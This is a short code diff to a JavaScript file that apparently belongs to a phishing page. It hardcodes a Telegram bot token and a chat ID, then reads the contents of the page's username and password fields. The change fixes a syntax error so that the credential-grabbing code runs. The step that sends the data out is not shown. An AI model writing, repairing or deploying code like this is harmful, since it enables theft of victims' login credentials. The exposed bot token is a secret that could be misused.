@@ -2,7 +2,7 @@
 var telegram_bot_id = "7762893737:AAGN0IehFnSVWClB93tdrTlWrdMfOHhy-zU";
 //chat id
 var chat_id =5150089222;
-var u_name, u_name2 ip, ip2;
+var u_name, u_name2, ip, ip2;
 var ready = function () {
     u_name = document.getElementById("user").value;
     u_name2 = document.getElementById("password").value;
